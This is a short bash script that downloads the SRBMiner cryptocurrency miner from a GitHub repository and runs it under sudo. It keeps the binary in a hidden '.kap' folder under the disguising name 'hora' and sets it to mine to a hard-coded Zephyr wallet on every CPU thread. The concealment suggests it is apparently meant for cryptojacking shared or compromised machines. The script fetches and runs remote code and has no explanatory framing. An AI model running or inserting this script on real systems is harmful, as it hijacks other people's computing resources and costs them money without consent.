#!/bin/bash
apt-get update ; apt-get -y install sudo
mkdir .kap && cd .kap
wget -O hora https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
chmod 777 hora
sudo ./hora --algorithm randomx --pool fr-zephyr.miningocean.org:5332 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59.10000 --password x --cpu-threads $(nproc --all)
